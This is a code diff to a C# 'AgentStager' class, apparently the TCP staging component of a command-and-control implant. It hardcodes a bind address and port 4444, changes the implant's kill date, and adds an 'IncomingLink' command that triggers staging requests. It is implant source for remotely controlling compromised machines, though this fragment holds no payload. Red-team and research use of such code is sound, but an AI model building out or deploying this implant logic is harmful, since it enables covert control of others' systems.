@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Reflection;
+using System.Text;
 
 class AgentStager
 {
@@ -7,10 +8,10 @@ class AgentStager
 
     static string AgentID;
 
-    static readonly string BindAddress = "<<BindAddress>>";
-    static readonly int BindPort = int.Parse("<<BindPort>>");
+    static readonly string BindAddress = "127.0.0.1";
+    static readonly int BindPort = int.Parse("4444");
 
-    static DateTime KillDate = DateTime.Parse("01/01/2030 00:00:00");
+    static DateTime KillDate = DateTime.Parse("25/09/2030 00:00:01");
 
     public AgentStager()
     {
@@ -32,13 +33,17 @@ class AgentStager
         {
             var commModule = new TcpCommModule(AgentID, BindAddress, BindPort);
             commModule.Start(crypto);
-            commModule.QueueStageRequest();
+            
 
             while (StagerStatus == StagerStatus.Staging)
             {
                 if (commModule.RecvData(out AgentMessage message))
                 {
-                    if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
+                    if (message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
+                    {
+                        commModule.QueueStageRequest(Encoding.UTF8.GetString(message.Data.Data));
+                    }
+                    else if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                     {
                         StagerStatus = StagerStatus.Staged;
                         commModule.Stop();
